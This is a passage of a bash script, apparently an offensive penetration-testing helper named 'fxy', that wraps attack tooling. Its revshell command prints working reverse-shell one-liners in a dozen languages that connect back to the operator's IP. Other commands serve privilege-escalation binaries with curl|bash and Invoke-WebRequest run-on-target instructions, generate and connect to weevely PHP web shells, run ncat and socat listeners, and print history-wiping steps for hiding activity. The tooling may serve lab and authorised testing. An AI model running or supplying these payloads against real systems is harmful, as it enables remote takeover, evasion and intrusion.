    | sed -E 's/^[ ]{1,}//gm' \
    | grep -E '^(.:|inet)' \
    | cut -d' ' -f1-2 \
    | sed 's,^inet,  inet,g'
  echo "X: extip"
  echo -n "  inet "; getExtIP; echo
  exit
fi
## ipwsh [port]^: Download InsecurePowerShell and serve via davserver
if [ "$1" == "ipwsh" ]; then
  echo "${ques} Download InsecurePowerShell and serve via davserver?"; prompt
  CMD="davserver"
  export INSTCMD="python3 -m pip install PyWebDAV3"
  checkCmd

  FPATH="/dev/shm/.fxy/ipwsh"
  if [ -d "$FPATH/pwsh" ]; then
    cd "$FPATH/pwsh"
  else
    mkdir -p "$FPATH"
    cd "$FPATH"
    wget https://github.com/cobbr/InsecurePowerShell/releases/download/InsecurePowerShell-v6.0.0-rc.2/InsecurePowerShell-v6.0.0-rc.2-win-x64.zip -O pwsh.zip
    unzip pwsh.zip
    mv InsecurePowerShell-v6.0.0-rc.2-win-x64 pwsh
    cd pwsh
  fi

  PORT="80"
  if [ "$#" -ge 2 ]; then
    PORT="$2"
  fi

  echo -e "\n${info}${txtbld} Run this on your target:"

  if [ "$PORT" -eq 80 ]; then
    echo "  \\\\$(getIP)\DavWWWRoot\pwsh\pwsh.exe"
  else
    echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh\pwsh.exe"
  fi
  echo "${txtrst}"

  CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH -n"
  echo "${bldwht}> $CMD${txtrst}";
  bash -c "$CMD"
  exit
fi
# 2DO:
# - Somehow ipwsh can't access c:\
## len(gth) [input]^: Show length of input
if [[ "$1" =~ ^len(gth)?$ ]] && [ "$#" -ge 2 ]; then
  CMD="wc"; checkCmd
  INPUT="$(echo -n "$@" | cut -d' ' -f2-)"
  CMD="echo -n '$INPUT' | wc -c"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
## l(isten) [port]^: ncat -vlkp PORT
if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
  CMD="ncat"; checkCmd
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  else
    PORT="9001"
  fi
  CMD="$CMD -vlkp $PORT"
  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "${info} Shell upgrade instructions:"
  echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    Ctrl-z"
  echo "    stty raw -echo"
  echo "    fg + [Enter x 2]"
  echo -n "    export SHELL=/bin/bash; export TERM=$TERM;"
  ROWS="$(stty -a | grep -oE "rows [0-9]{1,}" | cut -d' ' -f2)"
  COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
  echo -e " stty rows $ROWS columns $COLS\n"
  # https://attack.mitre.org/techniques/T1070/003/
  echo "${info} OPSEC Linux:"
  echo "    unset HISTFILE; export HISTFILESIZE=0;"
  echo "    # make sure to check history before deleting!"
  echo -e "    history -c; rm ~/.bash_history\n"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
## nfs|showmount^: showmount -e RHOST
if [ "$1" == "nfs" ] || [ "$1" == "showmount" ]; then
  CMD="showmount"; checkCmd
  CMD="showmount -e $RHOST"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## nikto [s(sl)|tls] [subdir]^: nikto -host PROTO://RHOST+SUBDIR | tee
if [ "$1" == "nikto" ]; then
  CMD="$1"
  export INSTCMD="apt install nikto -y"
  checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -host $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## n(map) [full]^: nmap -v -A (-p-) RHOST | tee
if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
  CMD="nmap"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "full" ]; then
    CMD="$CMD -p-"
  fi
  CMD="$CMD -v -A $RHOST -oA ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S)"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## pass(word)^: Show default machine password
if [ "$#" -eq 1 ] && [[ "$1" =~ ^pass(word)?$ ]]; then
  getMachinePass
  echo -e "\n  The following password is used as default value in various locations and is unique to this machine."
  echo -e "\n  Default machine password: $PASSWD\n"
  exit
fi
## peas [version] [port]^: Download *peas and serve via http.server
if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy peas lin"
  echo "  fxy peas winbat"
  echo "  fxy peas winany"
  echo "  fxy peas win86"
  echo "  fxy peas win64"
  exit
fi

if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
  echo "${ques} Download *peas and serve via http.server?"; prompt

  FPATH="/dev/shm/.fxy/peas"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"

  case "$2" in
    "lin")       wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
    "winbat")    wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat' -O "$FPATH/winPEAS.bat" ;;
    "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
    "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
    "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
    *)           echo "${warn} Error parsing PEAS version for download!"; exit ;;
  esac

  PORT="80"
  if [ "$#" -eq 3 ]; then
    PORT="$3"
  fi

  CMD="python3 -m http.server $PORT"
  echo "${info}${txtbld} Run this on your target:"

  case "$2" in
    "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_\$(whoami).log" ;;
    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
    *)           echo "${warn} Error parsing PEAS version for help text!"; exit ;;
  esac

  echo "${txtrst}"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
# 2DO:
# - winpeas flagged by AMSI :/
# - Different DL for v2?: (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe'
## p(ing) [count]^: ping -c COUNT RHOST
if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
  CMD="ping"; checkCmd

  if [ "$#" -eq 2 ]; then
    CMD="$CMD -c $2"
  fi

  CMD="$CMD $RHOST"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
## rev(shell) [type] [port]^: Reverse shell generator (bash, php, python, perl, ...)
# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy revshell [type] [port]"
  echo -e "\nAvailable revshells:"
  SHELLS="bash php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go ps|psh|pwsh|powershell lua telnet socat"
  IFS=" "
  for i in $SHELLS; do
    echo "[+] $i"
  done | sort
  echo -e "\n[i] Checkout for more: https://book.hacktricks.xyz/shells/shells/linux\n"
  exit
fi

# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
  PORT="9001"
  if [ "$#" -ge 3 ]; then
    PORT="$3"
  fi

  echo -e "> Run this on your target:\n"
  TYPE="$2"
  case "$TYPE" in
    "bash")                         echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
    "php")                          echo "php -r '\$s=fsockopen(\"$(getIP)\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
    "python2"|"py2")                echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "python"|"python3"|"py"|"py3")  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
    "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
    "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
    "awk")                          echo -e "${info} WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
    "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
    "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
    "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
    "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
    "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
    *)                              echo "${warn} Unknown revshell type!" ;;
  esac
  echo
  exit
fi
# 2DO:
# - ruby revshell doesn't work somehow
# - psh flagged by AMSI :/
# $a = New-Object System.Net.Sockets.TCPClient('127.0.0.1',30033);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$e = (iex $d 2>&1 | Out-String );$f  = $e + "PS> ";$g = ([text.encoding]::ASCII).GetBytes($f);$b.Write($g,0,$g.Length);$b.Flush()};$a.Close()
## rpc(client) [cid] [domain] [cmd]^: rpcclient
#rpcclient -A auth.txt -W domain.local 10.10.10.193 -c "enumdomusers" > out.txt
if [ "$1" == "rpc" ] || [ "$1" == "rpcclient" ]; then
  CMD="rpcclient"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    # NULL session?
    if [ "$2" -eq 0 ]; then
      CMD="$CMD -U '' -N"
    else
      CID="$2"
      getCreds
      CMD="$CMD -U '$USRNME%$PASSWD'"
    fi
  fi

  # workgroup?
  WRKGRP=""
  if [ "$#" -ge 3 ]; then
    WRKGRP="-W $3"
  fi

  # command?
  CMND=""
  if [ "$#" -ge 4 ]; then
    CMND="-c $4 | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$4_$(date +%F_%H%M%S).log"
  fi

  CMD="$CMD $WRKGRP $RHOST $CMND"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## smbpasswd [cid]^: smbpasswd -r RHOST -U :cid_user
if [ "$1" == "smbpasswd" ]; then
  CMD="$1"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -r $RHOST -U $USRNME"
  echo "Password: $PASSWD"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## socat [port]^: socat based listener
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
if [ "$1" == "socat" ]; then
  CMD="$1"; checkCmd
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  else
    PORT="9001"
  fi
  CMD="$CMD file:$(tty),raw,echo=0 tcp-listen:$PORT"
  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "> Run this on your target:"
  echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
## ssh [cid] [port]^: sshpass -e ssh :cid_user@RHOST -p PORT
if [ "$1" == "ssh" ]; then
  CMD="sshpass";
  export INSTCMD="apt install sshpass -y"
  checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    CID="$2"
    getCreds
  fi

  export SSHPASS=$PASSWD
  CMD="sshpass -v -e ssh -o StrictHostKeyChecking=no $USRNME@$RHOST"

  # port?
  if [ "$#" -eq 3 ]; then
    PORT="$3"
    CMD="$CMD -p $PORT"
  fi

  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
# Show 2DOs - internal command
if [ "$#" -eq 1 ] && [[ "$1" =~ ^(2|to)do$ ]]; then
  grep -Ein "^##|^# 2DO|^# -" "$0" | sed 's,\\t.*,,'
  exit
fi

# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
# msf multi handler
# msf venom most common
# smbclient
# smbmap
# enum4linux
# bash one liners
# user agent
## up(date)^: Update fxy
if [[ "$1" =~ ^up(date)?$ ]]; then
  # update for git clone
  if [ "$(which git)" ]; then
    FXYPATH=$(sed 's,fxy$,,' <<< "$0")
    cd "$FXYPATH" || exit
    if [[ "$(git config remote.origin.url)" =~ doomguy/fxy\.git$ ]]; then
      git fetch --all \
        && git reset --hard origin/master \
        && echo "${info} Update successful!"
      exit
    fi
  fi

  # update for non-git installations
  CMD="wget"
  export INSTCMD="apt install wget -y"
  checkCmd

  wget 'https://raw.githubusercontent.com/doomguy/fxy/master/build/fxy' -O "$0" \
  && chmod +x "$0" \
  && echo "${info} Update successful!"
  exit
fi
## weevely [gen|help]^: weevely php shell
# weevely help
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
  echo "Available commands:"
  echo "  fxy weevely gen [file] [password]"
  echo "  fxy weevely [s(sl)|tls] [subdir] [file] [password]"
  exit
fi

# weevely generate
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  getMachinePass
  # filename?
  if [ "$#" -ge 3 ]; then
    FILE="$3"
  fi
  # pasword?
  if [ "$#" -eq 4 ]; then
    PASSWD="$4"
  fi
  CMD="$CMD generate $PASSWD $FILE"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi

# weevely connect mode
if [ "$1" == "weevely" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  PROTO="http"
  SUBDIR="/"
  getMachinePass
  
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$PROTO" == "http" ]; then
      case "$#" in
        "2")  SUBDIR="$2" ;;
        "3")  SUBDIR="$2"; FILE="$3" ;;
        "4")  SUBDIR="$2"; FILE="$3"; PASSWD="$4" ;;
      esac
    elif [ "$PROTO" == "https" ]; then
      case "$#" in
        "3")  SUBDIR="$3" ;;
        "4")  SUBDIR="$3"; FILE="$4" ;;
        "5")  SUBDIR="$3"; FILE="$4"; PASSWD="$5" ;;
      esac
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## wfuzz^: wfuzz | tee
# wfuzz help
if [ "$1" == "wfuzz" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy wfuzz vhost [s|ssl|tls] [domain] [hw] [hc]"
  echo "  fxy wfuzz [s|ssl|tls] [subdir] [hw] [hc]"
  exit
fi

# wfuzz vhost
if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  DOMAIN="$RHOST"
  if [ "$#" -ge 3 ]; then
    # https?
    if [[ "$3" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$#" -ge 4 ] && [ "$PROTO" == "https" ]; then
      DOMAIN="$4"
    elif [ "$#" -ge 3 ] && [ "$PROTO" == "http" ]; then
      DOMAIN="$3"
    fi
  fi

  # Setup tmp path and wordlist
  FPATH="/dev/shm/.fxy/wfuzz"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"
  if [ ! -f "subdomains-top1million-20000.txt" ]; then
    wget 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt' -O subdomains-top1million-20000.txt
  fi

  HW=""; HC=""
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; HC="--hc $5"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; fi
  if [ "$#" -eq 6 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; HC="--hc $6"; fi

  CMD="wfuzz -H 'Host: FUZZ.$DOMAIN' -u '$PROTO://$RHOST' -w $FPATH/subdomains-top1million-20000.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_vhost_$(date +%F_%H%M%S).log"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

# wfuzz normal
if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUB="/"
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$#" -ge 3 ] && [ "$PROTO" == "https" ]; then
      SUB="$3"
    elif [ "$#" -ge 2 ] && [ "$PROTO" == "http" ]; then
      SUB="$2"
    fi
  fi

  HW=""; HC=""
  if [ "$#" -eq 3 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; HC="--hc $4"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; HC="--hc $5"; fi

  CMD="wfuzz -u '$PROTO://${RHOST}${SUB}' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi
# Nothing found? Invalid command?
showHelp
